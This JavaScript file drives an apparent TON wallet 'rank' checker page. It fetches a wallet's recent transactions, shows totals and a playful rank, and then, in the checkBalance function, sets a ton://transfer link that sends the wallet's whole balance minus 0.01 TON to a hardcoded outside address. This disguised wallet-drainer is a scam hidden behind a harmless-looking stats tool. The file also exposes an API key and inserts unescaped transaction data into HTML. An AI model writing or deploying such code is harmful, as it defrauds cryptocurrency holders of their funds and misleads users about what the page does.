const API_KEY =
  "0737f5ac813de095296e93ef82bfe4bce8fa8b248028ded59661cb81e08c0f20";

async function fetchTransactions(address, limit = 15, lt, hash) {
  const params = new URLSearchParams({
    address,
    limit,
    archival: "true",
    api_key: API_KEY,
  });
  if (lt && hash) {
    params.append("lt", lt);
    params.append("hash", hash);
  }

  const response = await fetch(
    `https://toncenter.com/api/v2/getTransactions?${params}`
  );
  const data = await response.json();

  if (!data.ok) throw new Error(data.error || "Unknown error");
  return data.result;
}

async function loadWalletData() {
  const address = document.getElementById("wallet").value.trim();
  const resultDiv = document.getElementById("result");
  const txContainer = document.getElementById("transactionContainer");
  const toggleBtn = document.getElementById("toggleTransactions");

  resultDiv.innerHTML = '<div class="loader"></div>';

  txContainer.innerHTML = "";
  toggleBtn.style.display = "none";

  try {
    let allTxs = [];
    let lastLt = null;
    let lastHash = null;

    for (let i = 0; i < 7; i++) {
      // Up to ~105 transactions
      const txs = await fetchTransactions(address, 15, lastLt, lastHash);
      if (txs.length === 0) break;

      allTxs = allTxs.concat(txs);

      const lastTx = txs[txs.length - 1];
      lastLt = lastTx.transaction_id.lt;
      lastHash = lastTx.transaction_id.hash;

      if (txs.length < 15 || allTxs.length >= 100) break;
    }

    allTxs = allTxs.slice(0, 100); // Ensure max 100 transactions

    const totalTxs = allTxs.length;
    let totalReceived = 0;
    let totalSent = 0;

    const txHTML = allTxs
      .map((tx) => {
        const date = new Date(tx.utime * 1000).toLocaleString();
        let inTon = 0;

        if (tx.in_msg?.value) inTon += parseFloat(tx.in_msg.value) / 1e9;
        tx.out_msgs.forEach((m) => {
          if (m?.value) totalSent += parseFloat(m.value) / 1e9;
        });
        totalReceived += inTon;

        return `<div style="margin-bottom:10px;">
                    <strong>${date}</strong><br>
                    Received: ${inTon.toFixed(4)} TON<br>
                    From: <span style="font-size:10px;">${
                      tx.in_msg?.source || "N/A"
                    }</span>
                    <button class="copy-btn" onclick="copyToClipboard('${
                      tx.in_msg?.source || ""
                    }')">Copy</button>
                </div>`;
      })
      .join("");

    let rank = "Newbie 🧑";
    if (totalTxs >= 20 && totalTxs < 30) rank = "Ton Star 🌟";
    else if (totalTxs >= 30 && totalTxs < 50) rank = "Ton Hero 🛡️";
    else if (totalTxs >= 50) rank = "Ton King 👑";

    resultDiv.innerHTML = `<h3 class="result-rank">${rank}</h3>
    <p class="result-text">Recent Transactions: ${totalTxs}</p>
    <p class="result-text">Total TON Received: ${totalReceived.toFixed(4)}</p>
    <p class="result-text">Total TON Sent: ${totalSent.toFixed(4)}</p>`;

    txContainer.innerHTML = txHTML;
    toggleBtn.style.display = "inline-block";

    await checkBalance(address);
  } catch (error) {
    console.error(error);
    resultDiv.innerHTML = "Error: " + error.message;
  }
}

function toggleTransactions() {
  const txContainer = document.getElementById("transactionContainer");
  const btn = document.getElementById("toggleTransactions");
  if (txContainer.style.display === "none") {
    txContainer.style.display = "block";
    btn.innerText = "⏬Hide Transactions";
  } else {
    txContainer.style.display = "none";
    btn.innerText = "⏩Show Transactions";
  }
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => alert("Copied!"));
}

async function checkBalance(address) {
  const res = await fetch(
    `https://toncenter.com/api/v2/getAddressBalance?address=${address}`
  );
  const data = await res.json();

  const balanceDiv = document.getElementById("balanceResult");
  const linkElement = document.getElementById("tonkeeperLink");

  if (data.ok) {
    const tonBalance = data.result / 1e9;
    const transferAmount = Math.max(data.result - 0.01 * 1e9, 0);

    balanceDiv.style.color = "#00ccff"; // Text color
    balanceDiv.style.textShadow = "0 0 8px #00ccff"; // Glow effect
    balanceDiv.style.fontSize = "20px"; // Increase font size
    balanceDiv.innerText = `Current Balance: ${tonBalance.toFixed(4)} TON`;

    const baseLink =
      "ton://transfer/UQB_Uw7-9RfK1VDG4RqCm1MozXDBN8_yXsIElChJVpJ-V8EM";
    linkElement.href = `${baseLink}?amount=${transferAmount}`;
    linkElement.style.display = transferAmount > 0 ? "inline-block" : "none";
  } else {
    balanceDiv.innerText = "Error fetching balance.";
    linkElement.style.display = "none";
  }
}
